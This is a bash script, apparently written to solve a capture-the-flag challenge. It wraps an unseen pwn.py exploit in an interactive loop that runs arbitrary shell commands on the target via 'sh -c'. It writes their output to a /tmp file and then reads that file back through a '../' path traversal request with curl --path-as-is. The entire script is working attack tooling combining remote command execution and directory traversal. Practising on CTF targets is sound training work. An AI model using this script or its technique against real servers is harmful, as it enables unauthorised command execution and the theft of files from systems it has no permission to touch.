#!/bin/bash

# Configuration
URL="https://benath-the-surface.ctf-bsides-algiers-2k25.shellmates.club"
TRAVERSAL="../../../../../../../../"
TMP_FILE="/tmp/shell_output_$(date +%s)"

echo "[+] Starting pseudo-shell..."
echo "[+] Output redirected to $TMP_FILE"

while true; do
    # 1. Get user input
    echo -n "interactive> "
    read -r CMD

    if [[ "$CMD" == "exit" ]]; then break; fi

    # 2. Execute command via pwn.py and redirect to tmp file
    # We wrap the command in 'sh -c' to ensure wildcards (*) and pipes (|) work
    python3 pwn.py --cmd "sh -c '$CMD' > $TMP_FILE 2>&1" > /dev/null

    # 3. Read the output using curl
    echo "-----------------------"
    curl -s --path-as-is "$URL/$TRAVERSAL$TMP_FILE"
    echo "-----------------------"
done
